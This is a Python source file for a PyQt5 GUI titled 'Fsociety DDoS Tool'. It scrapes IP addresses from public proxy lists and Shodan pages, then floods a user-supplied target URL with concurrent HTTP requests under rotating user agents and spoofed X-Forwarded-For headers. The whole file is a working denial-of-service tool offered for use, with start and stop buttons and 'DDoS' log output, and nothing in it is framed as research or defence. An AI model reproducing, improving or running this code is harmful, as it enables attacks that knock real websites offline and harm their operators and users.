import sys
import requests
import asyncio
import aiohttp
import random
import re
import itertools
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QMessageBox
)
from PyQt5.QtGui import QPixmap, QIcon
from PyQt5.QtCore import QThread, Qt
from io import BytesIO
from urllib.parse import urlparse

UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14.6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]

ip_list_urls = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.shodan.io/search?query=brazil",
    "https://www.shodan.io/search?query=germany",
    "https://www.shodan.io/search?query=france",
    "https://www.shodan.io/search?query=USA",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://geonode.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
]

class AttackThread(QThread):
    def __init__(self, target_url, num_requests):
        super().__init__()
        self.target_url = target_url
        self.num_requests = num_requests
        self.is_attacking = True

    async def fetch_ip_addresses(self, url):
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url) as response:
                    text = await response.text()
                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                    return ip_addresses
            except Exception as e:
                print(f"Error fetching IP list from {url}: {e}")
                return []

    async def get_all_ips(self):
        tasks = [self.fetch_ip_addresses(url) for url in ip_list_urls]
        ip_lists = await asyncio.gather(*tasks)
        all_ips = [ip for sublist in ip_lists for ip in sublist]
        return all_ips

    async def send_request(self, session, ip_address, semaphore):
        async with semaphore:
            headers = {
                "User-Agent": random.choice(UserAgents),
                "X-Forwarded-For": ip_address
            }
            try:
                async with session.get(self.target_url, headers=headers) as response:
                    print(f"fsociety> DDoS {self.target_url} from IP: {ip_address} - Status: {response.status}")
            except Exception as e:
                print(f"Error sending request from IP: {ip_address} - {e}")

    async def attack(self):
        ip_list = await self.get_all_ips()
        ip_cycle = itertools.cycle(ip_list)
        semaphore = asyncio.Semaphore(100)
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(self.num_requests):
                if not self.is_attacking:
                    break
                task = self.send_request(session, next(ip_cycle), semaphore)
                tasks.append(task)
            await asyncio.gather(*tasks)
        print("Attack completed.")

    def stop(self):
        self.is_attacking = False

    def run(self):
        asyncio.run(self.attack())

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Fsociety DDoS GUI")
        self.setGeometry(200, 200, 800, 600)

        # Мрачный стиль
        self.setStyleSheet("""
            background-color: #000000;
            color: #ffffff;
            font-size: 14px;
        """)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        layout = QVBoxLayout()

        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setStyleSheet("background-color: #000000;")
        layout.addWidget(self.image_label)

        image_url = "https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2016/08/avira_blog_mr.robot-header.jpg"
        self.load_image(image_url)

        self.fsociety_label = QLabel("Fsociety DDoS Tool")
        self.fsociety_label.setStyleSheet("""
            color: #ff0000;
            font-size: 24px;
            font-weight: bold;
            text-align: center;
        """)
        layout.addWidget(self.fsociety_label)

        self.url_label = QLabel("Target URL:")
        self.url_label.setStyleSheet("color: #ffffff;")
        layout.addWidget(self.url_label)

        self.url_input = QLineEdit()
        self.url_input.setStyleSheet("""
            background-color: #1a1a1a;
            color: #ffffff;
            border: 1px solid #444;
            padding: 5px;
        """)
        layout.addWidget(self.url_input)

        self.requests_label = QLabel("Number of Requests:")
        self.requests_label.setStyleSheet("color: #ffffff;")
        layout.addWidget(self.requests_label)

        self.requests_input = QLineEdit()
        self.requests_input.setStyleSheet("""
            background-color: #1a1a1a;
            color: #ffffff;
            border: 1px solid #444;
            padding: 5px;
        """)
        layout.addWidget(self.requests_input)

        self.start_button = QPushButton("Start Attack")
        self.start_button.setIcon(QIcon.fromTheme("media-playback-start"))
        self.start_button.setStyleSheet("""
            background-color: #ff0000;
            color: #000000;
            padding: 10px;
            font-weight: bold;
            border: none;
        """)
        self.start_button.clicked.connect(self.start_attack)
        layout.addWidget(self.start_button)

        self.stop_button = QPushButton("Stop Attack")
        self.stop_button.setIcon(QIcon.fromTheme("media-playback-stop"))
        self.stop_button.setStyleSheet("""
            background-color: #444;
            color: #ffffff;
            padding: 10px;
            font-weight: bold;
            border: none;
        """)
        self.stop_button.clicked.connect(self.stop_attack)
        self.stop_button.setEnabled(False)
        layout.addWidget(self.stop_button)

        central_widget.setLayout(layout)

    def load_image(self, image_url):
        try:
            response = requests.get(image_url)
            response.raise_for_status()
            pixmap = QPixmap()
            pixmap.loadFromData(BytesIO(response.content).getvalue())
            self.image_label.setPixmap(pixmap.scaled(400, 400, Qt.KeepAspectRatio))
        except Exception as e:
            print(f"Error loading image: {e}")
            self.image_label.setText("Image not loaded")

    def is_valid_url(self, url):
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except ValueError:
            return False

    def start_attack(self):
        target_url = self.url_input.text()
        try:
            num_requests = int(self.requests_input.text())
        except ValueError:
            QMessageBox.critical(self, "Error", "Number of requests must be an integer.")
            return

        if not target_url or num_requests <= 0:
            QMessageBox.critical(self, "Error", "Please provide a valid URL and number of requests.")
            return

        if not self.is_valid_url(target_url):
            QMessageBox.critical(self, "Error", "Please provide a valid URL.")
            return

        print(f"Starting attack on {target_url} with {num_requests} requests...")

        self.attack_thread = AttackThread(target_url, num_requests)
        self.attack_thread.start()

        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

        QMessageBox.information(self, "Info", "Attack started. Check the terminal for logs.")

    def stop_attack(self):
        if self.attack_thread:
            self.attack_thread.stop()
            self.start_button.setEnabled(True)
            self.stop_button.setEnabled(False)
            QMessageBox.information(self, "Info", "Attack stopped.")

app = QApplication(sys.argv)
window = MainWindow()
window.show()
sys.exit(app.exec_())